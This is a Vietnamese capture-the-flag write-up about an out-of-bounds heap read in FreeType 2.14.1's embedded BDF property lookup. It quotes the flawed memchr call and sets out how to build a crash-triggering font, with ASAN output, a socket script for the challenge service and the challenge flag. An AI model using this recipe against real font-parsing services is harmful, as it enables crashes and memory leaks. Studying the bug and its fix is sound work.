---
title: "VULN#006"
category: "Vuln Research"
tags: ["freetype", "ttbdf", "bdf", "sfnt", "out-of-bounds-read", "font-parser", "asan"]
solve_date: "2026-11-03T09:50:38+07:00"
language: "vi"
points: 94
---

# VULN#006 — FreeType đọc OOB khi tìm embedded BDF property

**Flag:** CTF{88315c14eccce5613b6913b8b89f53c7}  
**Service:** 169.58.126.107:7030  
**Định dạng flag:** CTF{}

## Đề bài

> VULN#006 — 94 điểm. Font-inspection service nhận file font tùy ý rồi đọc một phần metadata.

Service nhận length big-endian 4 byte rồi raw font bytes. Handout là source tree FreeType 2.14.1 và harness nhỏ. Target là crash oracle: chỉ memory-safety bug được chọn mới trả flag.

## Phân tích

### Harness và đường xử lý

harness/harness.c gọi FreeType đúng ba lần:

```c
FT_New_Memory_Face(library, buf, len, 0, &face);
FT_Set_Pixel_Sizes(face, 0, 16);
FT_Get_BDF_Property(face, "FOO", &prop);
```

Lần gọi cuối đọc bảng BDF nhúng bên trong SFNT font — đường xử lý qua src/sfnt/ttbdf.c, không phải standalone BDF driver. Source tree giống từng byte với upstream 2.14.1; chỉ có thêm harness/.

### Bug

tt_face_find_bdf_prop() kiểm tra string offset của property so với strings_size, nhưng sau đó truyền cho ft_memchr() toàn bộ string-table size thay vì phần còn lại:

```c
if ( value < bdf->strings_size &&
     ft_memchr( bdf->strings + value, 0, bdf->strings_size ) )
```

Scan bắt đầu tại strings + value, nên có thể đọc tới value byte quá cuối string table. Khi value = strings_size - 1 và sau offset cuối không có NUL, memchr đi khỏi allocation.

Bug có từ năm 2005. FreeType commit b6c6934 (2026-07-19, “src/sfnt/ttbdf.c (tt_face_find_bdf_prop): Fix OOB read”) sửa lỗi; fix được phát hành trong **2.15.0** (2026-10-12). Security fixes của 2.15.0 theo dõi dưới CVE-2026-50811 / CVE-2026-95512; challenge dùng parent 2.14.1.

### Dựng PoC

PoC là SFNT tối giản tạo bằng FontTools, có bảng BDF kết thúc đúng cuối file:

| Thành phần | Giá trị |
|---|---|
| Strikes | 1 strike tại 16 ppem |
| Property atoms | 1 — tên FOO |
| String table | 1022 byte: FOO\0 rồi byte A không có NUL |
| Property value | 1021 (strings_size - 1) |
| Kích thước BDF table | 1044 byte, đặt ở EOF |
| Tổng font | 1936 byte |

ft_memchr(strings + 1021, 0, 1022) đọc một byte cuối table rồi tiếp tục vượt allocation. ASAN xác nhận:

```text
ERROR: AddressSanitizer: heap-buffer-overflow ... memchr
  #1 tt_face_find_bdf_prop   src/sfnt/ttbdf.c:216
  #2 FT_Get_BDF_Property     src/base/ftbdf.c:82
  #3 main                    harness/harness.c:67
0 bytes to the right of 1936-byte region
```

PoC:

```text
foo.ttf
1,936 bytes
sha256 d88f2cb9f9cdf46370ce05ba55ae58b17ac0d337407f141eecfb92a550517921
```

### Remote

```python
import socket, struct

data = open("foo.ttf", "rb").read()
s = socket.create_connection(("169.58.126.107", 7030), timeout=10)
s.sendall(struct.pack(">I", len(data)) + data)
print(s.recv(4096).decode())
```
```text
status: crash confirmed (heap-buffer-overflow in embedded BDF property lookup)
FLAG: CTF{88315c14eccce5613b6913b8b89f53c7}
```

## Ghi chú

- Service chỉ đọc một property (FOO), nên PoC chỉ cần một property atom và một strike. Không cần load glyph hay render.
- Để over-read đi khỏi buffer, bảng phải kết thúc đúng cuối allocation; đặt BDF table ở EOF là cách ổn định.
- Fix cho loại lỗi này là truyền strings_size - value cho memchr, không phải toàn bộ table size.

## Tham khảo

- FreeType 2.14.1 src/sfnt/ttbdf.c
- FreeType commit b6c6934a76fae579fce081b03e2e74aca17e7eeb — “Fix OOB read”
- FreeType 2.15.0 release (2026-10-12)
- FreeType issue #1446 — heap-buffer-over-read trong embedded BDF property lookup: https://gitlab.freedesktop.org/freetype/freetype/-/work_items/1446
